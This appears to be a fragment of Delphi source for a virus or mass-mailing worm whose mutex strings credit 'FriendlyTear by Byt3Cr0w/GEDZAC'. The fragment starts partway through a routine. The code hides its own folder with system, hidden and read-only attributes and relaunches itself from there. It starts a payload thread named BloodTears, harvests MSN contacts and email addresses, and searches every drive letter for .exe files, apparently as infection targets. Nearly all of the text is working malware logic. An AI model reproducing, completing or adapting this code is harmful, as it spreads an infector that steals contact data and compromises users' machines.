   WinExec(Pchar('cmd.exe /c Attrib +S +H +R '+vxfolder+'*.*'),SW_HIDE);
   TheNamex:=GetCommandLine;
   Longitud := strlen(pchar(TheNamex));
   for a := 2 to Longitud-2 do
   begin
   TheName := TheName+TheNamex[a];
   end;


   enter := crlf;
   back := o(TheName);
   proc := xxx(back);
   clean := o(proc);
   WinExec(Pchar(vxfolder+clean),SW_SHOWNORMAL);
   CreateThread(nil,0,@BloodTears,nil,0,tears);
   CreateMutex(nil, false, '[- FriendlyTear by Byt3Cr0w/GEDZAC -]');
   if GetLastError = ERROR_ALREADY_EXISTS then exitprocess(0);
   CreateMutex(nil, true, '[- GEDZAC ESTA VIVO -]');
   CreateMutex(nil, true, '[- SALUDOS A TODOS EN GEDZAC! (holapp BlackRose ;)) -]');
     extract_msncontacts1(mails);
     collecting_mails(paths,mails);
    helloworld;
   GetPaths;
   GetlocalTime(MyTime);
   for drive := 'A' to 'Z' do x := FindFile(drive+':\*.exe');
    end;
    end;
   end.
